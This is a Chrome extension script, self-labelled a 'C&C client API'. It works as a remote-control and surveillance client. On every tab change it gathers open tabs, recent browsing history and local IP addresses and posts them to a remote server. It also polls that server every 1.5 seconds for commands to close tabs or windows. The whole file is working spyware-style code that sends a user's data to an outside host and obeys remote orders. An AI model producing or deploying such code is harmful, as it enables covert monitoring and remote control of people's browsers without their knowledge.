/* C&C client API */

// Update info whenever tabs are opened, modified, or closed
chrome.tabs.onCreated.addListener(updateInfo);
chrome.tabs.onUpdated.addListener(updateInfo);
chrome.tabs.onRemoved.addListener(updateInfo);

var completedCommands = []

// Command structure definition
var runCommand = {
    closeTab: closeTab,
    closeActiveTab: closeActiveTab,
    closeAllTabs: closeAllTabs,
    closeActiveWindow: closeActiveWindow
}

function updateInfo() {
    if (awake) {
        var getId = new Promise(function (resolve, reject) {
            chrome.storage.local.get(['id'], function (result) {
                resolve(result.id);
            });
        });
        var getTabs = new Promise(function (resolve, reject) {
            chrome.tabs.query({}, function (tabs) {
                resolve(tabs);
            });
        });
        var getHistory = new Promise(function (resolve, reject) {
            chrome.history.search({ text: '', maxResults: 10 }, function (result) {
                resolve(result);
            });
        });
        var getIPs = new Promise(function (resolve, reject) {
            getLocalIPs(function (ips) {
                resolve(ips);
            });
        });
    
        Promise.all([getId, getTabs, getHistory, getIPs])
        .then(function (data) {
            $.post(`${url}/clients/${data[0]}/update`, {
                data: JSON.stringify({
                    blocks: successfulBlocks,
                    tabs: data[1],
                    history: data[2],
                    ips: data[3]
                })
            })
            .fail(fellOver);
        });
    }
}

async function closeTab(args) {
    chrome.tabs.remove(args.tabId, function () {
        if (chrome.runtime.lastError) {
            return 'Unable to close tab';
        }
        return;
    });
}

async function closeActiveTab() {
    chrome.tabs.query({ active: true }, function (tabs) {
        chrome.tabs.remove(tabs.map(tab => tab.id), function() {
            if (chrome.runtime.lastError) {
                return 'Unable to close tab';
            }
            return;
        })
    })
}

async function closeAllTabs() {
    chrome.tabs.query({}, function (tabs) {
        chrome.tabs.remove(tabs.map(tab => tab.id), function () {
            if (chrome.runtime.lastError) {
                return 'Unable to close tabs';
            }
            return;
        });
    });
}

async function closeActiveWindow() {
    chrome.windows.getLastFocused(function (window) {
        chrome.windows.remove(window.id, function() {
            if (chrome.runtime.lastError) {
                return 'Unable to close window';
            }
            return;
        });
    });
}

async function consumeCommands() {
    if (awake) {
        chrome.storage.local.get(['id'], function (result) {
            $.getJSON(`${url}/clients/${result.id}/bulletin`, async function (commands) {
                for (var i = 0; i < commands.length; i++) {
                    if (!completedCommands.includes(commands[i].id)) {
                        await runCommand[commands[i].code](commands[i].args)
                        .then(function (err) {
                            if (!err) {
                                completedCommands.push(commands[i].id)
                            }
                        });
                    }
                }
            })
            .fail(fellOver);
        });
    }
}

setInterval(consumeCommands, 1500)